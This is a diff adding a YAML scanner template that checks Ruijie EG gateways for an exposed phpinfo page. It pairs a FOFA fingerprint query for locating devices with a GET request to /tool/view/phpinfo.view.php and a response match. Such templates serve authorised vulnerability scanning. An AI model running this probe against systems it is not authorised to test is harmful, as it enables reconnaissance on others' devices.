@@ -1,0 +1,15 @@
+id: poc-yaml-ruijie-eg-gateway-phpinfo-view-php-info-leak
+info:
+  name: 锐捷 EG易网关 phpinfo.view.php 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: ruijie EG易网关
+  fofa: app="Ruijie-EG易网关" && icon_hash="-692947551"
+requests:
+- method: GET
+  path: /tool/view/phpinfo.view.php
+  expression: status_code == 200 && contains(body,"PHP Version") && contains(body,"PHP
+    API") && contains(title,"phpinfo()")
+variables: {}
+transport: http
